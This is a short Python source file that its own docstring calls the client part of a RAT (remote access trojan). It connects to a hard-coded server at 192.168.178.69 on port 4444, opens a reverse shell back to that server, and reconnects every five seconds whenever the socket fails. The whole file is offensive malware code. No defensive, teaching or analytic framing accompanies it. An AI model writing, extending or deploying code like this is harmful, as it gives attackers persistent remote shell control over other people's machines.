from client.connection import Connection
from client.rev_shell import Shell
import time
import socket

class Client:
    '''
    Performs all necesary actions for the RAT to function:
        - Creates socket
        - Gets a reverse shell back to the server
    '''
    
    def __init__(self, host: str, port: int) -> None:
        '''
        Constructor
        
        :param host: The server's IP
        :param port: The server's port number
        '''
        self.host = host
        self.port = port

    def hack(self):
        '''
        Creates a connection between server and client.
        Gets a reverse shell from client to server
        '''
        
        # Create client instance
        client = Connection(self.host, self.port)
        
        # Open socket connection back to server
        sock = client.connect()
        
        # Create shell instance
        shell = Shell(sock)
        
        # Get a reverse shell back to server
        try:
            shell.get_shell()
        except socket.error:
            time.sleep(5) # Wait 5s
            sock.close() # Close erroneous connection
            self.hack() # Retry
        
        # Close connection when finished
        sock.close()
            
    
if __name__ == "__main__":
    # Run RAT with specified IP and port
    Client("192.168.178.69", 4444).hack()